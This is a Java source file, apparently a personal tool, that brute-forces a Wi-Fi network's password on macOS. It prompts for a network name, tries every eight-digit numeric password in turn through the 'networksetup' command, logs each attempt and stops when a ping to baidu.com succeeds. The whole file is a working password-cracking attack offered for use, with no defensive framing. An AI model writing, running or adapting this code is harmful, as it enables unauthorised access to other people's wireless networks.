package com.test.api.api;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

/**
 * @projectName api
 * @package com.test.api.api
 * @className App2
 * @description TODO
 * @auther wangsheng
 * @creatTime 2021/8/5 10:47 上午
 * @company 四川省万源市一生活智能科技有限公司
 * @department 小程序-微信小程序
 */

public class App2 {

    public static File logFile = new File("/Users/wangsheng/Desktop/aa/run.log");
    public static String wifiName = null;
    public static String algorithm = null;

    public static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    // 最大密码数量
    public static int maxPass = 99999999;

    // 初始密码数量
    public static int startPass = 0;


    public static void main(String[] args) throws IOException, InterruptedException {
        boolean parentEx = logFile.getParentFile().exists();
        if (!parentEx) {
            logFile.getParentFile().mkdirs();
        }

        if (!logFile.exists()) {
            logFile.createNewFile();
        }

        FileWriter fw = new FileWriter(logFile, true);

        Scanner sca = new Scanner(System.in);
        System.out.print("请输入需要破解的wifi名称:");
        wifiName = sca.next();

        System.out.println("请选择破解wifi算法");
        System.out.println("1为0-99999999尝试破解");
        System.out.println("2为10000000-99999999尝试");
        System.out.println("3为自定义开始值");
        System.out.print("请选择:");
        algorithm = sca.next();

        if ("2".equals(algorithm)) {
            startPass = 10000000;
        } else if ("3".equals(algorithm)) {
            System.out.print("请输入初始值:");
            startPass = Integer.parseInt(sca.next());
        }

        if (wifiName == null || wifiName.length() == 0 || algorithm == null || algorithm.length() == 0) {
            System.out.println("参数错误");
            return;
        }


        while (startPass < maxPass) {
            String password = getPass(startPass);
            String cmd = String.format("networksetup -setairportnetwork en0 %s %s", wifiName, password);
            List<String> exec = execute(cmd);

            fw.append(sdf.format(new Date()) + "," + cmd + ",res=" + exec.toString() + System.getProperty("line.separator"));
            fw.flush();

            if (exec.contains(String.format("Could not find network %s.", wifiName))) {
                continue;
            }
            if (exec.size() == 0 && ping(cmd)) {
                fw.append(sdf.format(new Date()) + "," + "连接成功 wifi名称:" + wifiName + ",密码:" + password + System.getProperty("line.separator"));
                fw.flush();
                break;
            }

            startPass++;
        }

        fw.close();
    }

    /**
     * ping 校验
     */
    private static boolean ping(String wifiCmd) throws IOException, InterruptedException {
        /**
         * 应连接wifi需要一定的时间所以睡眠3秒
         */
        Thread.sleep(1000 * 3);
        boolean pinged = false;
        String cmd = "ping www.baidu.com";
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));
        String s = bReader.readLine();
        if (s != null && s.length() > 0) {
            pinged = true;
        }
        process.getInputStream().close();
        bReader.close();

        return pinged;
    }


    /**
     * 执行cmd 命令
     *
     * @param cmd
     * @return
     * @throws IOException
     */
    public static List<String> execute(String cmd) throws IOException {
        Process process = null;
        BufferedReader bReader = null;
        List<String> result = new ArrayList<String>();
        try {
            process = Runtime.getRuntime().exec(cmd);
            bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                result.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            process.getInputStream().close();
            bReader.close();

        }
        return result;
    }


    /**
     * 获得密码
     *
     * @param passStr
     * @return
     */
    public static String getPass(Integer passStr) {
        String str = String.format("%08d", passStr);
        return str;
    }


}